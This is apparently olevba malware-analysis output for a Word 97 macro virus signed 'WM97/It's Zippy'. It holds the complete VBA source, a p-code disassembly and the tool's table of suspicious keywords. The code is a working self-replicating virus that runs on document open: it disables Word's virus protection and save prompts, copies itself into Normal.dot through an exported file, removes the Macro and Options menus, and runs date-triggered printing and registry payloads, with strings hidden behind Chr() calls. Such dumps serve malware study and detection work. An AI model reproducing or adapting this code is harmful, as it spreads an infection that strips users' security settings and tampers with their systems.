olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ay
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ay - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo zippy

Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48): jx = 0: xj = 1

rytx = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines

sytx = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines

If sytx > Abs(jx) And rytx > Abs(jx) Then GoTo zippy

If sytx = Abs(jx) Then

    Set rylx = NormalTemplate.VBProject.VBComponents

    Set xhst = ActiveDocument.VBProject.VBComponents

    If Month(Now()) = 8 And Day(Now()) = 13 Then Application.ActiveDocument.PrintOut , , , "The Zippy Infection.vir"

    If Month(Now()) = 9 And Day(Now()) = 13 Then Application.ActiveDocument.PrintOut , , , "Virus says Hi.vir"

    If Month(Now()) = 10 And Day(Now()) = 13 Then Application.ActiveDocument.PrintOut , , , "Stop killing baby virii.vir"

    If Month(Now()) = 11 And Day(Now()) = 13 Then Application.ActiveDocument.PrintOut , , , "Zippy Zippy Zippy.vir"

    If Month(Now()) = 12 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "It's Zippy!"
 
    xhst.Item(Cos(Atn(CInt(1)))).Name = rylx.Item(Cos(Atn(CInt(1)))).Name

    xhst.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Chr(46) + Chr(100) + Chr(108) + Chr(108)

End If

If rytx = Abs(jx) Then Set rylx = ActiveDocument.VBProject.VBComponents

rylx.Item(Cos(Atn(CInt(1)))).codemodule.AddFromFile Windows.Application.Path & Chr(46) + Chr(100) + Chr(108) + Chr(108)

With rylx.Item(Cos(Atn(CInt(1)))).codemodule

    For j = Chr(49) To Chr(52)

    .deletelines Chr(49)

        Next j

    End With

With rylx.Item(Cos(Atn(CInt(1)))).codemodule

For j = Chr(50) To 72 Step Chr(50)

    .replaceline j, Chr(39) & Application.DisplayRecentFiles & Application.Assistant & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version

    Next j

 End With

If sytx = Abs(jx) Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Delete

If sytx = Abs(jx) Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(79) + Chr(112) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(115) + Chr(46) + Chr(46) + Chr(46)).Delete

If sytx = Abs(jx) Then rylx.Item(Cos(Atn(CInt(1)))).codemodule.replaceline Abs(xj), "Sub AutoClose()"

If sytx = Abs(jx) And rytx = Abs(jx) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

zippy:

If sytx <> Abs(jx) And rytx = Abs(jx) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

'WM97/It's Zippy by Virus
'                        (.)(.)
'                          (_
'                        \____/
'                            U  Smile, with a bit of class!
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.ay
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5472 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	OnError zippy 
' Line #3:
' Line #4:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St jx 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St xj 
' Line #5:
' Line #6:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St rytx 
' Line #7:
' Line #8:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St sytx 
' Line #9:
' Line #10:
' 	Ld sytx 
' 	Ld jx 
' 	FnAbs 
' 	Gt 
' 	Ld rytx 
' 	Ld jx 
' 	FnAbs 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo zippy 
' 	EndIf 
' Line #11:
' Line #12:
' 	Ld sytx 
' 	Ld jx 
' 	FnAbs 
' 	Eq 
' 	IfBlock 
' Line #13:
' Line #14:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set rylx 
' Line #15:
' Line #16:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set xhst 
' Line #17:
' Line #18:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ParamOmitted 
' 	ParamOmitted 
' 	ParamOmitted 
' 	LitStr 0x0017 "The Zippy Infection.vir"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall PrintOut 0x0004 
' 	EndIf 
' Line #19:
' Line #20:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ParamOmitted 
' 	ParamOmitted 
' 	ParamOmitted 
' 	LitStr 0x0011 "Virus says Hi.vir"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall PrintOut 0x0004 
' 	EndIf 
' Line #21:
' Line #22:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ParamOmitted 
' 	ParamOmitted 
' 	ParamOmitted 
' 	LitStr 0x001B "Stop killing baby virii.vir"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall PrintOut 0x0004 
' 	EndIf 
' Line #23:
' Line #24:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ParamOmitted 
' 	ParamOmitted 
' 	ParamOmitted 
' 	LitStr 0x0015 "Zippy Zippy Zippy.vir"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall PrintOut 0x0004 
' 	EndIf 
' Line #25:
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "It's Zippy!"
' 	LitStr 0x0000 ""
' 	LitStr 0x0021 "HKEY_CLASSES_ROOT\Word.Document.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #27:
' Line #28:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld rylx 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld xhst 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #29:
' Line #30:
' 	Ld Windows 
' 	MemLd Application 
' 	MemLd Path 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld xhst 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #31:
' Line #32:
' 	EndIfBlock 
' Line #33:
' Line #34:
' 	Ld rytx 
' 	Ld jx 
' 	FnAbs 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set rylx 
' 	EndIf 
' Line #35:
' Line #36:
' 	Ld Windows 
' 	MemLd Application 
' 	MemLd Path 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld rylx 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #37:
' Line #38:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld rylx 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #39:
' Line #40:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0034 
' 	ArgsLd Chr 0x0001 
' 	For 
' Line #41:
' Line #42:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #43:
' Line #44:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' Line #46:
' 	EndWith 
' Line #47:
' Line #48:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld rylx 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #49:
' Line #50:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0048 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	ForStep 
' Line #51:
' Line #52:
' 	Ld j 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemLd DisplayRecentFiles 
' 	Concat 
' 	Ld Application 
' 	MemLd Assistant 
' 	Concat 
' 	Ld Application 
' 	MemLd FocusInMailHeader 
' 	Concat 
' 	Ld Application 
' 	MemLd Build 
' 	Concat 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	Ld Application 
' 	MemLd Version 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #53:
' Line #54:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' Line #56:
' 	EndWith 
' Line #57:
' Line #58:
' 	Ld sytx 
' 	Ld jx 
' 	FnAbs 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #59:
' Line #60:
' 	Ld sytx 
' 	Ld jx 
' 	FnAbs 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #61:
' Line #62:
' 	Ld sytx 
' 	Ld jx 
' 	FnAbs 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld xj 
' 	FnAbs 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld rylx 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #63:
' Line #64:
' 	Ld sytx 
' 	Ld jx 
' 	FnAbs 
' 	Eq 
' 	Ld rytx 
' 	Ld jx 
' 	FnAbs 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #65:
' Line #66:
' 	Label zippy 
' Line #67:
' Line #68:
' 	Ld sytx 
' 	Ld jx 
' 	FnAbs 
' 	Ne 
' 	Ld rytx 
' 	Ld jx 
' 	FnAbs 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #69:
' Line #70:
' 	EndSub 
' Line #71:
' Line #72:
' 	QuoteRem 0x0000 0x0018 "WM97/It's Zippy by Virus"
' Line #73:
' 	QuoteRem 0x0000 0x001E "                        (.)(.)"
' Line #74:
' 	QuoteRem 0x0000 0x001C "                          (_"
' Line #75:
' 	QuoteRem 0x0000 0x001E "                        \____/"
' Line #76:
' 	QuoteRem 0x0000 0x003A "                            U  Smile, with a bit of class!"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

